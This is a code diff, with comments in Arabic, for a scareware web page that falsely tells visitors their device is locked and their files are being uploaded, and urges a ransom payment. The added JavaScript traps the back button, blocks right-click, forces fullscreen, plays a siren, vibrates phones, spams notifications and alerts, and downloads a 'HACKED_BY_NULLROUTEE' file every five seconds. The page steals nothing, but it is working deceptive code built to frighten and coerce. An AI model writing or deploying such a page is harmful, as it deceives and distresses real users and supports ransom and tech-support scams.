@@ -13,67 +13,109 @@
   }
   @keyframes flash { from { background: #000; } to { background: #1a0000; } }
   h1 { font-size: 40px; margin: 0 0 20px; text-transform: uppercase; text-shadow: 0 0 10px red; }
-  p { font-size: 20px; margin: 10px 0; max-width: 600px; line-height: 1.5; }
+  p { font-size: 18px; margin: 10px 0; max-width: 600px; line-height: 1.5; }
   .skull { font-size: 100px; margin-bottom: 20px; animation: pulse 0.5s infinite alternate; }
   @keyframes pulse { from { transform: scale(1); } to { transform: scale(1.1); } }
   .countdown { font-size: 30px; font-weight: bold; color: #fff; margin-top: 30px; }
+  #start-btn { margin-top: 40px; padding: 15px 30px; font-size: 20px; background: #ff0000; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; animation: pulse 1s infinite; }
 </style>
 </head>
 <body>
+
   <div class="skull">💀</div>
   <h1>CRITICAL WARNING</h1>
-  <p>Your device has been infected with a dangerous trojan.</p>
+  <p>Your device has been locked and infected with a dangerous trojan.</p>
   <p>All your personal files, photos, and passwords are being uploaded to our servers.</p>
-  <p>Do not close this window. Contact support immediately.</p>
-  <div class="countdown" id="timer">Data exfiltration in: 10</div>
+  <p>Click the button below to initiate the ransom payment.</p>
+  
+  <!-- زر لبدء الرعب (لازم يضغطه عشان المتصفح يسمح بالاشعارات والاهتزاز) -->
+  <button id="start-btn">INITIATE SYSTEM SCAN</button>
+  
+  <div class="countdown" id="timer" style="display:none;">Data exfiltration in: 10</div>
 
 <script>
-  // 1. قفل زر الرجوع
+  // قفل زر الرجوع
   history.pushState(null, null, location.href);
-  window.onpopstate = function () {
-      history.go(1);
-  };
-
-  // 2. تشغيل الصوت المزعج (يشتغل أول ما يلمس الشاشة)
-  let audioCtx;
-  function startSiren() {
-    if (audioCtx) return;
-    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    const osc = audioCtx.createOscillator();
-    const gain = audioCtx.createGain();
-    osc.type = 'sawtooth';
-    osc.frequency.value = 800;
-    gain.gain.value = 0.1;
-    osc.connect(gain);
-    gain.connect(audioCtx.destination);
-    osc.start();
-    
-    // تغيير التردد عشان يطلع صوت إنذار حقيقي
-    setInterval(() => {
-      osc.frequency.value = osc.frequency.value === 800 ? 400 : 800;
-    }, 400);
-  }
-
-  document.body.addEventListener('click', startSiren, { once: true });
-  document.body.addEventListener('touchstart', startSiren, { once: true });
-
-  // 3. بوب أب لا نهائي (كل 3 ثواني)
-  setInterval(() => {
-    alert("⚠️ WARNING: YOUR SYSTEM IS COMPROMISED ⚠️\n\nYour IP has been logged.\nClose this tab if you dare...");
-  }, 3000);
-
-  // 4. عداد تنازلي وهمي
-  let timeLeft = 10;
-  const timerEl = document.getElementById('timer');
-  setInterval(() => {
-    if (timeLeft > 0) {
-      timeLeft--;
-      timerEl.textContent = `Data exfiltration in: ${timeLeft}`;
-    }
-  }, 1000);
+  window.onpopstate = function () { history.go(1); };
 
   // منع النقر بالزر الأيمن
   document.addEventListener('contextmenu', event => event.preventDefault());
+
+  let started = false;
+  document.getElementById('start-btn').addEventListener('click', async () => {
+    if (started) return;
+    started = true;
+    document.getElementById('start-btn').style.display = 'none';
+    document.getElementById('timer').style.display = 'block';
+
+    // 1. طلب الشاشة الكاملة
+    if (document.documentElement.requestFullscreen) {
+      document.documentElement.requestFullscreen().catch(e => {});
+    }
+
+    // 2. صوت الإنذار
+    try {
+      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      const osc = audioCtx.createOscillator();
+      const gain = audioCtx.createGain();
+      osc.type = 'sawtooth';
+      osc.frequency.value = 800;
+      gain.gain.value = 0.1;
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+      osc.start();
+      setInterval(() => {
+        osc.frequency.value = osc.frequency.value === 800 ? 400 : 800;
+      }, 300);
+    } catch(e) {}
+
+    // 3. اهتزاز الجوال (أندرويد)
+    if (navigator.vibrate) {
+      setInterval(() => { navigator.vibrate([1000, 200, 1000, 200, 2000]); }, 3000);
+    }
+
+    // 4. إشعارات مزعجة
+    if ("Notification" in window) {
+      let perm = await Notification.requestPermission();
+      if (perm === "granted") {
+        setInterval(() => {
+          new Notification("⚠️ SYSTEM HACKED", {
+            body: "NullRoutee owns your device. Data is being uploaded...",
+            icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png"
+          });
+        }, 2000);
+      }
+    }
+
+    // 5. تحميل ملفات قسرية كل 5 ثواني
+    setInterval(() => {
+      const a = document.createElement('a');
+      const blob = new Blob(["YOU HAVE BEEN HACKED BY NULLROUTEE.\n\nYour IP has been logged.\nAll your data has been exfiltrated.\n\nGood luck."], {type: "text/plain"});
+      a.href = URL.createObjectURL(blob);
+      a.download = "HACKED_BY_NULLROUTEE.txt";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }, 5000);
+
+    // 6. بوب أب لا نهائي
+    setInterval(() => {
+      alert("⚠️ WARNING: YOUR SYSTEM IS COMPROMISED ⚠️\n\nClose this tab if you dare...");
+    }, 4000);
+
+    // 7. العداد التنازلي
+    let timeLeft = 10;
+    const timerEl = document.getElementById('timer');
+    setInterval(() => {
+      if (timeLeft > 0) {
+        timeLeft--;
+        timerEl.textContent = `Data exfiltration in: ${timeLeft}`;
+      } else {
+        timerEl.textContent = "UPLOAD COMPLETE. DEVICE LOCKED.";
+        timerEl.style.color = "#ff0000";
+      }
+    }, 1000);
+  });
 </script>
 </body>
 </html>
